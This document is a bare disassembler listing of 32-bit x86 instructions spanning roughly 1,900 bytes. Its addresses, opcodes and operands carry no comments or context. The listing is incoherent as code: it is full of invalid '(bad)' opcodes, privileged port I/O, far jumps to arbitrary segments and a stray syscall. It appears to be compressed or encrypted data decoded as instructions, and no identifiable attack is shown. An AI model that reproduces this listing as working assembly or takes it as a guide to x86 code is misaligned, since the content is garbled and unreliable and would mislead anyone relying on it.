  41b34b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b34c:	add    bh,BYTE PTR [ebp-0x71a83829]
  41b352:	jle    0x41b304
  41b354:	outs   dx,BYTE PTR ds:[esi]
  41b355:	dec    ah
  41b357:	jecxz  0x41b365
  41b359:	lock cmp BYTE PTR [edx+0x526e3791],al
  41b360:	in     eax,dx
  41b361:	out    dx,eax
  41b362:	dec    eax
  41b363:	arpl   WORD PTR [ecx+0x50],bp
  41b366:	mul    BYTE PTR [eax+0x70f16927]
  41b36c:	xor    DWORD PTR [ebx+0x3202ce54],edi
  41b372:	(bad)  
  41b373:	mov    ebx,edx
  41b375:	cdq    
  41b376:	and    edx,DWORD PTR [ebp-0x61]
  41b379:	adc    al,0x95
  41b37b:	and    al,0x53
  41b37d:	sbb    edi,DWORD PTR ss:[eax]
  41b380:	mov    WORD PTR [ebp-0x65ec4278],gs
  41b386:	mov    es,WORD PTR [ecx+0x56]
  41b389:	(bad)  
  41b38a:	jns    0x41b3d9
  41b38c:	jnp    0x41b381
  41b38e:	mov    cl,0x8c
  41b390:	inc    esi
  41b391:	out    0x8a,al
  41b393:	sbb    bh,BYTE PTR ds:0x999fcec1
  41b399:	ins    BYTE PTR es:[edi],dx
  41b39a:	pop    es
  41b39b:	mov    ds:0x9ca5eca2,al
  41b3a0:	push   cs
  41b3a1:	addr16 push 0x49e082f6
  41b3a7:	pop    ds
  41b3a8:	mov    ebp,0xfb13a9be
  41b3ad:	imul   edx,DWORD PTR [edi+0x69f54a70],0x98ba34ce
  41b3b7:	pop    edx
  41b3b8:	push   0x211d5ef2
  41b3bd:	push   edi
  41b3be:	add    bl,BYTE PTR [ebp+0x61c5d68]
  41b3c4:	dec    esi
  41b3c5:	pop    ecx
  41b3c6:	(bad)  
  41b3c7:	ficomp DWORD PTR [edx]
  41b3c9:	push   ss
  41b3ca:	mov    ds:0x1ee53967,al
  41b3cf:	add    esi,edi
  41b3d1:	pop    eax
  41b3d2:	dec    ebx
  41b3d3:	pop    ecx
  41b3d4:	sbb    al,0xf8
  41b3d6:	jmp    0x9c0df493
  41b3db:	fstp   DWORD PTR [esp+esi*1+0x6c]
  41b3df:	adc    al,0x2d
  41b3e1:	call   0xae2d6a06
  41b3e6:	xor    BYTE PTR [eax-0x3b4099dc],bh
  41b3ec:	ret    0x2d00
  41b3ef:	jno    0x41b3c4
  41b3f1:	in     eax,0xb9
  41b3f3:	jbe    0x41b3e9
  41b3f5:	test   al,0x19
  41b3f7:	xchg   ecx,eax
  41b3f8:	sar    DWORD PTR [edx+eax*1],cl
  41b3fb:	loop   0x41b3ea
  41b3fd:	xchg   ebx,eax
  41b3fe:	in     eax,dx
  41b3ff:	cmc    
  41b400:	loopne 0x41b448
  41b402:	and    eax,0x5919a818
  41b407:	mov    ebx,0x2282f779
  41b40c:	inc    esi
  41b40d:	sbb    BYTE PTR [edx],cl
  41b40f:	inc    esp
  41b410:	stos   DWORD PTR es:[edi],eax
  41b411:	push   ecx
  41b412:	add    ch,BYTE PTR [edi+eax*4-0x5c9f7e15]
  41b419:	ins    DWORD PTR es:[edi],dx
  41b41a:	adc    bh,dh
  41b41c:	jns    0x41b469
  41b41e:	or     al,dl
  41b420:	mov    bl,0x69
  41b422:	xchg   ebx,eax
  41b423:	adc    al,0x51
  41b425:	xor    ah,0xec
  41b428:	jo     0x41b3bf
  41b42a:	(bad)  [edx+0x17f03642]
  41b430:	add    dl,cl
  41b432:	std    
  41b433:	das    
  41b434:	enter  0xb304,0x54
  41b438:	outs   dx,DWORD PTR ds:[esi]
  41b439:	aaa    
  41b43a:	cmp    ebx,ebx
  41b43c:	adc    al,0x26
  41b43e:	sahf   
  41b43f:	fadd   DWORD PTR [esi+0x49a4086]
  41b445:	lods   eax,DWORD PTR ds:[esi]
  41b446:	lock es ja 0x41b4b4
  41b44a:	jbe    0x41b496
  41b44c:	inc    edi
  41b44d:	imul   eax,DWORD PTR [esi+0x42a57827],0x2
  41b454:	addr16 and al,0x3f
  41b457:	stos   BYTE PTR es:[edi],al
  41b458:	daa    
  41b459:	dec    ebx
  41b45a:	les    edx,FWORD PTR [edx]
  41b45c:	jmp    0x41b4c6
  41b45e:	nop
  41b45f:	inc    edx
  41b460:	push   es
  41b461:	mov    ah,0xb4
  41b463:	mov    ebx,0x56e308c8
  41b468:	cwde   
  41b469:	adc    al,0x63
  41b46b:	aad    0xc0
  41b46d:	jnp    0x41b491
  41b46f:	xchg   ebp,eax
  41b470:	xchg   esi,eax
  41b471:	and    edx,DWORD PTR [edx]
  41b473:	shl    BYTE PTR [edi],0xdc
  41b476:	aaa    
  41b477:	aas    
  41b478:	ret    0x546
  41b47b:	mov    bh,0xb1
  41b47d:	cwde   
  41b47e:	out    dx,eax
  41b47f:	sub    eax,DWORD PTR [eax]
  41b481:	xchg   edx,eax
  41b482:	loopne 0x41b4ca
  41b484:	xor    dl,0x9e
  41b487:	sbb    DWORD PTR ds:0xc75c980e,0x196a8776
  41b491:	jecxz  0x41b431
  41b493:	mov    esp,0x51c3786c
  41b498:	push   esi
  41b499:	daa    
  41b49a:	dec    edi
  41b49b:	and    BYTE PTR [ebp-0x66],0x7a
  41b49f:	repnz and al,0xbf
  41b4a2:	xchg   edx,eax
  41b4a3:	sbb    esp,esi
  41b4a5:	les    eax,FWORD PTR ds:0x341bb48a
  41b4ab:	sbb    eax,0xef6f2338
  41b4b0:	push   ebp
  41b4b1:	pop    esi
  41b4b2:	gs push cs
  41b4b4:	dec    ecx
  41b4b5:	jae    0x41b476
  41b4b7:	jo     0x41b457
  41b4b9:	js     0x41b502
  41b4bb:	xchg   ebp,eax
  41b4bc:	or     BYTE PTR [ebx-0x4e9b18c],ah
  41b4c2:	xchg   ebp,eax
  41b4c3:	sar    DWORD PTR [ecx+eax*1],1
  41b4c6:	or     al,BYTE PTR [ebp+ebp*8+0x37]
  41b4ca:	sbb    eax,0x20e9cc99
  41b4cf:	fild   QWORD PTR [esi+ebx*8+0x29]
  41b4d3:	or     ebx,DWORD PTR [edx]
  41b4d5:	dec    edx
  41b4d6:	jno    0x41b48c
  41b4d8:	loopne 0x41b504
  41b4da:	cmc    
  41b4db:	add    al,0xbc
  41b4dd:	fmul   st(3),st
  41b4df:	mov    gs,WORD PTR [eax]
  41b4e1:	and    bh,BYTE PTR [ebx]
  41b4e3:	(bad)  
  41b4e4:	ja     0x41b521
  41b4e6:	push   ss
  41b4e7:	les    edi,FWORD PTR [edx-0x61786e93]
  41b4ed:	mov    esp,0x987e57df
  41b4f2:	retf   0xb042
  41b4f5:	jns    0x41b552
  41b4f7:	jne    0x41b55c
  41b4f9:	inc    DWORD PTR [edx]
  41b4fb:	leave  
  41b4fc:	xchg   esi,eax
  41b4fd:	clc    
  41b4fe:	cmp    esi,DWORD PTR [esi]
  41b500:	into   
  41b501:	sar    BYTE PTR [edi-0x4b],1
  41b504:	sub    esi,DWORD PTR [edx]
  41b506:	xor    esp,ebp
  41b508:	adc    al,0xc7
  41b50a:	cs push esp
  41b50c:	les    eax,FWORD PTR [edx+0x16]
  41b50f:	adc    cl,BYTE PTR [esi]
  41b511:	mov    DWORD PTR [eax+0x7b],esi
  41b514:	in     al,0x43
  41b516:	cmp    al,0x52
  41b518:	push   ds
  41b519:	(bad)  [eiz*1+0x60cdd3fd]
  41b520:	adc    ecx,DWORD PTR [edx*1-0x787662f]
  41b527:	out    dx,eax
  41b528:	push   cs
  41b529:	ja     0x41b565
  41b52b:	stos   BYTE PTR es:[edi],al
  41b52c:	xchg   bh,ch
  41b52e:	mov    ecx,0x19bcc834
  41b533:	or     DWORD PTR [ebx+0x4db0903c],0xf05c78ab
  41b53d:	mov    ds:0x4d9103,eax
  41b542:	mov    DWORD PTR [eax+esi*2+0x7c0b73cb],esi
  41b549:	cmp    DWORD PTR [esi+0x4ed6e4],ecx
  41b54f:	not    DWORD PTR [esi]
  41b551:	sub    ebx,DWORD PTR [edi+0xf154e18]
  41b557:	or     eax,0x5ec37049
  41b55c:	fmul   QWORD PTR [ebp+0x2c2d35ac]
  41b562:	setg   BYTE PTR [ebx+edi*4+0x51]
  41b567:	(bad)  
  41b568:	stc    
  41b569:	adc    DWORD PTR [esi+0x17],ecx
  41b56c:	xor    dl,BYTE PTR [ebp-0x34]
  41b56f:	fs (bad) 
  41b571:	and    eax,0x420d67a4
  41b576:	retf   0x131b
  41b579:	sub    DWORD PTR [edx-0x4c],edi
  41b57c:	pop    ds
  41b57d:	in     eax,0x18
  41b57f:	add    BYTE PTR [ebp-0x75f3432a],dl
  41b585:	push   ds
  41b586:	xor    esi,0xffffffe8
  41b589:	cli    
  41b58a:	loop   0x41b522
  41b58c:	jle    0x41b606
  41b58e:	repnz mov eax,DWORD PTR [ebx]
  41b591:	cli    
  41b592:	imul   ecx,DWORD PTR [edi-0x47],0xa497a0c5
  41b599:	and    eax,0xb3479136
  41b59e:	sub    BYTE PTR [ebx],bl
  41b5a0:	out    dx,al
  41b5a1:	jmp    0x41b553
  41b5a3:	dec    ecx
  41b5a4:	cld    
  41b5a5:	xor    al,dh
  41b5a7:	aaa    
  41b5a8:	jl     0x41b572
  41b5aa:	pop    ebp
  41b5ab:	ret    
  41b5ac:	xchg   ebp,eax
  41b5ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5ae:	jns    0x41b563
  41b5b0:	mov    bh,0xc6
  41b5b2:	inc    edi
  41b5b3:	dec    ebp
  41b5b4:	scas   al,BYTE PTR es:[edi]
  41b5b5:	daa    
  41b5b6:	and    edi,edx
  41b5b8:	push   ebp
  41b5b9:	sbb    esi,ecx
  41b5bb:	test   al,0xec
  41b5bd:	fwait
  41b5be:	pop    ecx
  41b5bf:	lds    ecx,FWORD PTR [ebx+ebp*4]
  41b5c2:	icebp  
  41b5c3:	loop   0x41b5d9
  41b5c5:	jmp    0xfd5b:0xac53a93a
  41b5cc:	sar    DWORD PTR [ebp+0x48],cl
  41b5cf:	xchg   ecx,eax
  41b5d0:	and    esi,DWORD PTR [esi+0x2c]
  41b5d3:	cmp    BYTE PTR [ebx+0x32],0xe1
  41b5d7:	inc    esp
  41b5d8:	aad    0xea
  41b5da:	fninit 
  41b5dc:	inc    edi
  41b5dd:	cmovae eax,ebx
  41b5e0:	mov    ebx,0x31cd1391
  41b5e5:	dec    dx
  41b5e7:	(bad)  
  41b5e8:	cs inc ebp
  41b5ea:	add    esp,DWORD PTR [ecx+edi*1-0xa8cc349]
  41b5f1:	add    DWORD PTR ds:0xa7a5fea4,edx
  41b5f7:	popfw  
  41b5f9:	fimul  WORD PTR [eax]
  41b5fb:	or     al,0xeb
  41b5fd:	fsub   QWORD PTR [eax]
  41b5ff:	jg     0x41b5ee
  41b601:	mov    ebx,0x55a227de
  41b606:	push   es
  41b607:	sahf   
  41b608:	inc    ecx
  41b609:	test   ecx,0x34107a10
  41b60f:	ret    0x2f07
  41b612:	adc    dl,BYTE PTR [esi]
  41b614:	push   ecx
  41b615:	or     al,0xb
  41b617:	popf   
  41b618:	xchg   ecx,eax
  41b619:	les    eax,FWORD PTR [ecx-0x44]
  41b61c:	stos   DWORD PTR es:[edi],eax
  41b61d:	sub    BYTE PTR [ebp-0x22160eb5],cl
  41b623:	fisub  DWORD PTR [edx+0x69]
  41b626:	sub    al,0xa0
  41b628:	mov    dl,0x70
  41b62a:	shl    al,1
  41b62c:	dec    esp
  41b62d:	mul    DWORD PTR [eax+0x70]
  41b630:	pushf  
  41b631:	popf   
  41b632:	xor    al,0xe4
  41b634:	dec    edi
  41b635:	jp     0x41b655
  41b637:	ja     0x41b5f2
  41b639:	mov    ecx,0xc861b4c6
  41b63e:	xchg   ecx,eax
  41b63f:	loopne 0x41b65f
  41b641:	or     ecx,DWORD PTR [edi]
  41b643:	daa    
  41b644:	pop    ebx
  41b645:	jecxz  0x41b650
  41b647:	adc    eax,0xfa924462
  41b64c:	xor    DWORD PTR [eax+eiz*4+0x33],0xffffffe5
  41b651:	ins    BYTE PTR es:[edi],dx
  41b652:	dec    esi
  41b653:	dec    edi
  41b654:	mov    cl,dl
  41b656:	pop    ds
  41b657:	cmc    
  41b658:	xchg   ecx,eax
  41b659:	add    al,0xbc
  41b65b:	fidivr DWORD PTR [ebx-0x709b038c]
  41b661:	stos   DWORD PTR es:[edi],eax
  41b662:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b663:	out    0x85,eax
  41b665:	stos   DWORD PTR es:[edi],eax
  41b666:	dec    ebp
  41b667:	or     dl,bh
  41b669:	mov    esp,0x1ec89b74
  41b66e:	(bad)  
  41b670:	pop    edi
  41b671:	dec    ecx
  41b672:	add    edx,DWORD PTR [edx+0x5343c3e2]
  41b678:	into   
  41b679:	sbb    edi,DWORD PTR [eax]
  41b67b:	xlat   BYTE PTR ds:[ebx]
  41b67c:	cmp    al,0xdb
  41b67e:	mov    WORD PTR [edx],?
  41b680:	cwde   
  41b681:	mov    al,BYTE PTR [ebx-0x1addb71c]
  41b687:	int    0xbd
  41b689:	adc    al,0x4f
  41b68b:	rcr    DWORD PTR [eax-0x8],cl
  41b68e:	jne    0x41b656
  41b690:	enter  0x30da,0x62
  41b694:	aas    
  41b695:	cmp    DWORD PTR [edx+0xa],esp
  41b698:	sti    
  41b699:	adc    eax,0xa067447a
  41b69e:	or     eax,0xe04c2d7a
  41b6a3:	and    ecx,0x7b
  41b6a6:	cmc    
  41b6a7:	jmp    0xbdfcc261
  41b6ac:	ret    0xeb39
  41b6af:	mov    edx,0x1dad66c3
  41b6b4:	cmp    DWORD PTR [edx-0x1f5f7e38],0x361fd0b3
  41b6be:	pop    esp
  41b6bf:	stos   DWORD PTR es:[edi],eax
  41b6c0:	xchg   ecx,eax
  41b6c1:	mov    ebx,0xf9ad5a00
  41b6c6:	loope  0x41b6bf
  41b6c8:	scas   al,BYTE PTR es:[edi]
  41b6c9:	jbe    0x41b707
  41b6cb:	in     al,0x70
  41b6cd:	jmp    0x41b66a
  41b6cf:	mov    al,BYTE PTR [ebx+edx*4-0xea16f3c]
  41b6d6:	outs   dx,DWORD PTR ds:[esi]
  41b6d7:	sbb    ebp,DWORD PTR [eax-0x71]
  41b6da:	xchg   ebx,eax
  41b6db:	inc    esi
  41b6dc:	je     0x41b6a2
  41b6de:	xor    al,0xac
  41b6e0:	lods   eax,DWORD PTR ds:[esi]
  41b6e2:	adc    BYTE PTR [esi],ah
  41b6e4:	mov    BYTE PTR [eax+0x57],0x69
  41b6e8:	sub    BYTE PTR [ecx],bh
  41b6ea:	imul   esp,esp,0xa4b7970f
  41b6f0:	sti    
  41b6f1:	and    DWORD PTR [edi-0x49ee08ca],esp
  41b6f7:	xor    BYTE PTR [eax+0x47],ah
  41b6fa:	in     al,dx
  41b6fb:	adc    bh,BYTE PTR [ebx-0x69]
  41b6fe:	(bad)  
  41b6ff:	ins    DWORD PTR es:[edi],dx
  41b700:	xchg   edx,eax
  41b701:	mov    bl,0xf0
  41b703:	lods   al,BYTE PTR ds:[esi]
  41b704:	mov    dh,0x6f
  41b706:	shl    BYTE PTR [esi+0x5b],1
  41b709:	cmp    DWORD PTR [ebp-0xa29ff61],0x1e
  41b710:	arpl   WORD PTR [esi+0x10bff290],cx
  41b716:	jae    0x41b698
  41b718:	stos   BYTE PTR es:[edi],al
  41b719:	adc    ecx,edi
  41b71b:	mov    ecx,0x3eff49e4
  41b720:	push   ecx
  41b721:	retf   0x7787
  41b724:	mov    ds:0x7ebab00f,al
  41b729:	shr    BYTE PTR cs:[ebx],0x5b
  41b72d:	pop    esi
  41b72e:	(bad)  
  41b72f:	mov    esp,0x85457584
  41b734:	mov    al,0x88
  41b736:	mov    cs,WORD PTR [edx+0x18]
  41b739:	cmp    dl,BYTE PTR ds:0x8e29dd53
  41b73f:	jl     0x41b710
  41b741:	cld    
  41b742:	hlt    
  41b743:	daa    
  41b744:	sahf   
  41b745:	pop    ds
  41b746:	jmp    0x623f:0x5794d284
  41b74d:	mov    bl,0x64
  41b74f:	jae    0x41b721
  41b751:	retf   0xe6e7
  41b754:	sub    dl,ah
  41b756:	cmp    dl,ah
  41b758:	inc    ecx
  41b759:	enter  0x16d5,0xd7
  41b75d:	sbb    al,0x77
  41b75f:	lods   al,BYTE PTR ds:[esi]
  41b760:	iret   
  41b761:	pop    ecx
  41b762:	scas   eax,DWORD PTR es:[edi]
  41b763:	cmc    
  41b764:	pop    esi
  41b765:	jns    0x41b7b0
  41b767:	inc    esp
  41b768:	pop    es
  41b769:	or     ah,BYTE PTR [ebx+0x64a0575f]
  41b76f:	add    al,0x2
  41b771:	mov    dl,0xbb
  41b773:	xchg   esp,eax
  41b774:	call   0x6953:0xcd11db6
  41b77b:	(bad)  
  41b77c:	cmp    ch,BYTE PTR [esi-0x62a63f8e]
  41b782:	push   ecx
  41b783:	xor    dl,BYTE PTR [ebx+0x41]
  41b786:	retf   0x85c7
  41b789:	ss dec esi
  41b78b:	in     al,dx
  41b78c:	and    al,ah
  41b78e:	inc    edx
  41b78f:	cld    
  41b790:	or     edi,DWORD PTR [ebp-0x2e]
  41b793:	jmp    0x665a7ad5
  41b798:	add    dl,BYTE PTR [ebp+0x685d6e05]
  41b79e:	push   edx
  41b79f:	inc    edx
  41b7a0:	mov    eax,0xb566e1f9
  41b7a5:	setae  BYTE PTR [ecx-0x3]
  41b7a9:	sahf   
  41b7aa:	into   
  41b7ab:	mov    eax,0xa7f2b40c
  41b7b0:	and    ebp,DWORD PTR [edx+0x0]
  41b7b3:	jle    0x41b781
  41b7b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7b6:	jge    0x41b768
  41b7b8:	jecxz  0x41b804
  41b7ba:	mov    BYTE PTR [edi+esi*2+0x47],cl
  41b7be:	xor    esi,DWORD PTR [ebp-0x7a0b5fe0]
  41b7c4:	bnd jo 0x41b7ce
  41b7c7:	rcl    BYTE PTR [ebp+0x4c],cl
  41b7ca:	cmp    esi,0x285d42e9
  41b7d0:	mov    DWORD PTR [edi-0x3727e1],0xb0a47716
  41b7da:	dec    edi
  41b7db:	es jp  0x41b7a8
  41b7de:	jmp    0x982e:0xb50cff6a
  41b7e5:	pusha  
  41b7e6:	cmp    ah,BYTE PTR [edx]
  41b7e8:	dec    DWORD PTR [ebx+0x6a]
  41b7eb:	or     bh,BYTE PTR [esi-0x2f]
  41b7ee:	mov    ecx,0xbf8a5ae0
  41b7f3:	popf   
  41b7f4:	add    dl,BYTE PTR [ebx+eax*1+0x51]
  41b7f8:	add    BYTE PTR [edi],ch
  41b7fa:	(bad)  
  41b7fb:	pop    edi
  41b7fd:	outs   dx,DWORD PTR ds:[esi]
  41b7fe:	sub    eax,DWORD PTR ds:0xbaa25a1e
  41b804:	loop   0x41b83b
  41b806:	xchg   ebp,eax
  41b807:	gs and al,0x5
  41b80a:	fwait
  41b80b:	inc    edi
  41b80c:	inc    edx
  41b80d:	fldcw  WORD PTR [esi]
  41b80f:	sub    esi,DWORD PTR [eiz*8+0x31fd286]
  41b816:	dec    edx
  41b817:	cmp    bl,BYTE PTR [ecx+0xcbf2512]
  41b81d:	or     DWORD PTR [ebx],esi
  41b81f:	call   0x1354a50a
  41b824:	jp     0x41b80d
  41b826:	dec    esp
  41b827:	push   eax
  41b828:	mov    edi,0xbcecba06
  41b82d:	call   0xe575070d
  41b832:	push   eax
  41b833:	cwde   
  41b834:	loop   0x41b875
  41b836:	fadd   QWORD PTR [ebx]
  41b838:	dec    ebp
  41b839:	out    dx,al
  41b83a:	fisttp WORD PTR [ecx]
  41b83c:	pop    edi
  41b83d:	adc    BYTE PTR [eax-0x130269c5],bl
  41b843:	mov    bh,0xd4
  41b845:	data16 fdiv DWORD PTR gs:[ecx+0x7eaf9863]
  41b84d:	or     bl,ah
  41b84f:	jle    0x41b846
  41b851:	or     DWORD PTR [esp+ecx*2],esi
  41b854:	dec    edx
  41b855:	ret    
  41b856:	sbb    eax,0x3888c0d
  41b85b:	xor    ch,BYTE PTR [edi-0x49]
  41b85e:	inc    ebp
  41b85f:	inc    ebx
  41b860:	sbb    ecx,DWORD PTR [esi-0x3b]
  41b863:	dec    edi
  41b864:	aad    0xee
  41b866:	pop    esi
  41b867:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41b869:	xchg   esp,eax
  41b86a:	ficomp WORD PTR cs:[ebx+0x4a]
  41b86e:	push   esi
  41b86f:	pop    edx
  41b870:	adc    ebp,DWORD PTR [ecx]
  41b872:	mov    ebx,0x391fc941
  41b877:	mov    edi,0x2b396ffb
  41b87c:	jno    0x41b839
  41b87e:	outs   dx,BYTE PTR ds:[esi]
  41b87f:	xor    bl,ch
  41b881:	popa   
  41b882:	pop    edx
  41b883:	lahf   
  41b884:	nop
  41b885:	loope  0x41b8cf
  41b887:	ret    
  41b888:	ficomp WORD PTR [ebx+0x4f]
  41b88b:	push   edi
  41b88c:	push   ds
  41b88d:	into   
  41b88e:	clc    
  41b88f:	syscall 
  41b891:	push   ss
  41b892:	shl    BYTE PTR [ebp+0x1daa193],1
  41b898:	mov    bh,0xc9
  41b89a:	inc    ecx
  41b89b:	xorps  xmm0,XMMWORD PTR [ecx+0x43]
  41b89f:	cdq    
  41b8a0:	lods   eax,DWORD PTR ds:[esi]
  41b8a1:	ss dec ebx
  41b8a3:	sub    ebp,edi
  41b8a5:	pop    esp
  41b8a6:	jge    0x41b8f4
  41b8a8:	xchg   ebx,eax
  41b8a9:	push   ds
  41b8aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8ab:	jno    0x41b912
  41b8ad:	daa    
  41b8ae:	out    0x28,al
  41b8b0:	ins    BYTE PTR es:[edi],dx
  41b8b1:	mov    ds:0x398299a1,eax
  41b8b6:	jb     0x41b8f6
  41b8b8:	fwait
  41b8b9:	pop    eax
  41b8ba:	ds or  al,0xd4
  41b8bd:	sbb    DWORD PTR ss:[eax+esi*2],esi
  41b8c1:	push   esi
  41b8c2:	inc    edx
  41b8c3:	mov    dl,0xe7
  41b8c5:	xchg   ebp,eax
  41b8c6:	cmp    BYTE PTR [ecx],dl
  41b8c8:	ror    BYTE PTR [eax],0x7d
  41b8cb:	mov    bl,0xdd
  41b8cd:	xor    BYTE PTR [edx+0x2c2d418e],al
  41b8d3:	dec    ebx
  41b8d4:	inc    ecx
  41b8d5:	popf   
  41b8d6:	add    al,0x23
  41b8d8:	mov    ah,0x69
  41b8da:	jle    0x41b8ae
  41b8dc:	test   eax,0xe7489985
  41b8e1:	scas   al,BYTE PTR es:[edi]
  41b8e2:	add    ah,BYTE PTR ds:0x247c87cd
  41b8e8:	adc    al,0x20
  41b8ea:	mov    bl,0x81
  41b8ec:	sbb    ah,BYTE PTR [ebx]
  41b8ee:	cvtps2pd xmm1,QWORD PTR [ecx+0x1c]
  41b8f2:	in     eax,dx
  41b8f3:	jge    0x41b93e
  41b8f5:	add    cl,dh
  41b8f7:	xor    dl,bl
  41b8f9:	cmc    
  41b8fa:	dec    ecx
  41b8fb:	xlat   BYTE PTR ds:[ebx]
  41b8fc:	mov    esp,esi
  41b8fe:	push   cs
  41b8ff:	and    esp,DWORD PTR [eax+ecx*1-0xe119342]
  41b906:	repnz call 0xfadf:0x944dd0fa
  41b90e:	fld    TBYTE PTR [eax+0xc]
  41b911:	xchg   edx,eax
  41b912:	adc    eax,0x3949b2b7
  41b917:	lds    ebx,FWORD PTR [edx+0xf]
  41b91a:	call   0x1000:0xe886c93e
  41b921:	pop    ebp
  41b922:	cmp    al,0xbe
  41b924:	mov    edx,0xf1e6abe8
  41b929:	sbb    BYTE PTR [ebp+0x6a],0xb2
  41b92d:	xchg   ecx,eax
  41b92e:	ss call 0x54fd32a8
  41b934:	clc    
  41b935:	test   BYTE PTR [ebx-0x66e0847d],0xed
  41b93c:	inc    ecx
  41b93d:	out    0x12,al
  41b93f:	jl     0x41b980
  41b941:	push   0xffffffa1
  41b943:	xchg   ebx,eax
  41b944:	inc    eax
  41b945:	imul   DWORD PTR [eax+0x5913a8c1]
  41b94b:	push   esp
  41b94c:	std    
  41b94d:	xor    DWORD PTR [edi-0x3edb650],esp
  41b953:	outs   dx,DWORD PTR ds:[esi]
  41b954:	inc    ebx
  41b955:	xchg   edx,eax
  41b956:	pop    esp
  41b957:	retf   0x8235
  41b95a:	cli    
  41b95b:	xchg   esp,ebp
  41b95d:	sub    eax,0x2df6e981
  41b962:	ins    BYTE PTR es:[edi],dx
  41b963:	dec    ebx
  41b964:	cmp    dl,bh
  41b966:	fisttp QWORD PTR [ebp+0x74990592]
  41b96c:	sub    esi,DWORD PTR [ecx]
  41b96e:	loop   0x41b8fd
  41b970:	int3   
  41b971:	out    0x19,eax
  41b973:	nop
  41b974:	xor    al,0x19
  41b976:	(bad)  
  41b977:	or     eax,0xf933eba4
  41b97c:	retf   0x34b9
  41b97f:	dec    esi
  41b980:	nop
  41b981:	sbb    BYTE PTR [ecx-0x48],bh
  41b984:	(bad)  
  41b985:	icebp  
  41b986:	popf   
  41b987:	add    ecx,DWORD PTR [ebp+0xa00cd4e]
  41b98d:	and    eax,DWORD PTR [edi+0x74]
  41b990:	clc    
  41b991:	ins    DWORD PTR es:[edi],dx
  41b992:	add    al,0x7d
  41b994:	hlt    
  41b995:	mov    ds:0x90e038cd,al
  41b99a:	sti    
  41b99b:	jbe    0x41b93c
  41b99d:	ins    BYTE PTR es:[edi],dx
  41b99e:	mov    ah,0xd4
  41b9a0:	data16 fisttp QWORD PTR [ebx+0x33]
  41b9a4:	xchg   ebx,eax
  41b9a5:	cmp    DWORD PTR [ebp-0x34],ebp
  41b9a8:	pop    edx
  41b9a9:	lahf   
  41b9aa:	icebp  
  41b9ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9ac:	mov    dl,0xd5
  41b9ae:	xor    BYTE PTR [eax-0x29],ah
  41b9b1:	aam    0xd9
  41b9b3:	xchg   edi,eax
  41b9b4:	push   ss
  41b9b5:	rcr    BYTE PTR [esi+0x2be9c6d5],cl
  41b9bb:	jp     0x41b9ec
  41b9bd:	adc    ch,BYTE PTR [esp+ecx*8]
  41b9c0:	mov    ebx,0x781d6527
  41b9c5:	ins    DWORD PTR es:[edi],dx
  41b9c6:	cmp    al,BYTE PTR [ebx-0x10]
  41b9c9:	inc    eax
  41b9ca:	js     0x41ba03
  41b9cc:	and    dl,BYTE PTR [ebx-0x1eb58d81]
  41b9d2:	jmp    0xabae:0xd1e88cc1
  41b9d9:	cwde   
  41b9da:	nop
  41b9db:	push   ebx
  41b9dc:	out    dx,al
  41b9dd:	xor    eax,0xee9aa305
  41b9e2:	ror    edi,0xb1
  41b9e5:	xor    al,0x15
  41b9e7:	stc    
  41b9e8:	ret    
  41b9e9:	cs popa 
  41b9eb:	inc    edi
  41b9ec:	paddsb mm1,QWORD PTR [edx-0x7509c24c]
  41b9f3:	cmp    edi,DWORD PTR [esi+ebp*8-0x40035397]
  41b9fa:	iret   
  41b9fb:	sub    al,0xb
  41b9fd:	cmp    ch,bl
  41b9ff:	dec    esi
  41ba00:	lea    edi,[ebx]
  41ba02:	and    ebp,DWORD PTR [edx+edi*4-0x49]
  41ba06:	out    0x18,al
  41ba08:	adc    al,0xba
  41ba0a:	mov    dl,0xd0
  41ba0c:	out    dx,eax
  41ba0d:	xor    bl,BYTE PTR [esi+0x5b013378]
  41ba13:	fldenv [edi+0xce5c3f1]
  41ba19:	(bad)  
  41ba1a:	retf   0x3a15
  41ba1d:	dec    ebp
  41ba1e:	push   esp
  41ba1f:	(bad)  
  41ba20:	fild   WORD PTR [edx-0x59]
  41ba23:	into   
  41ba24:	sub    al,0x22
  41ba26:	jno    0x41ba90
  41ba28:	or     ebx,DWORD PTR [ecx+ecx*4+0x1a7b7dcd]
  41ba2f:	imul   esp,DWORD PTR [eax],0x77
  41ba32:	inc    edi
  41ba33:	cmp    DWORD PTR [ecx-0x24],ebx
  41ba36:	test   eax,0x24fbb504
  41ba3b:	cmp    al,0x26
  41ba3d:	cli    
  41ba3e:	xchg   edi,eax
  41ba3f:	(bad)  
  41ba40:	xor    eax,0xcb361c23
  41ba45:	in     eax,0xde
  41ba47:	adc    bl,BYTE PTR [ecx-0x74]
  41ba4a:	loop   0x41ba89
  41ba4c:	pop    ecx
  41ba4d:	push   edi
  41ba4f:	rol    DWORD PTR [edx-0x64],cl
  41ba52:	and    BYTE PTR [esp+ebp*8],0x48
  41ba56:	sbb    bl,BYTE PTR ss:[ebx]
  41ba59:	fwait
  41ba5a:	mov    dl,0xdf
  41ba5c:	das    
  41ba5d:	jmp    0x41b9ec
  41ba5f:	xchg   cl,ch
  41ba61:	dec    eax
  41ba62:	mov    dh,0x35
  41ba64:	ins    BYTE PTR es:[edi],dx
  41ba65:	je     0x41bab3
  41ba67:	xchg   BYTE PTR [ebp-0xfd5ca59],ah
  41ba6d:	mov    edi,0x265f3978
  41ba72:	sub    eax,0xeb0a994c
  41ba77:	sub    DWORD PTR [edx-0x5df1b575],esp
  41ba7d:	push   ss
  41ba7e:	mov    esi,0xee3e4aa7
  41ba83:	sub    eax,0xfb484dcb
  41ba88:	add    eax,0x8c7fa178
  41ba8d:	je     0x41badd
  41ba8f:	inc    eax
  41ba90:	push   0x727c8109
  41ba95:	mov    dl,0x82
  41ba97:	lods   eax,DWORD PTR ds:[esi]
  41ba98:	add    dl,dh
  41ba9a:	pop    ss
  41ba9b:	mov    cl,0x13
  41ba9d:	sbb    al,0xaa
  41ba9f:	xchg   ebx,eax
  41baa0:	xor    al,0xe2
  41baa2:	nop
  41baa3:	mov    ah,0xc1
  41baa5:	and    cl,BYTE PTR ds:0xa456687f
  41baab:	scas   eax,DWORD PTR es:[edi]
  41baac:	icebp  
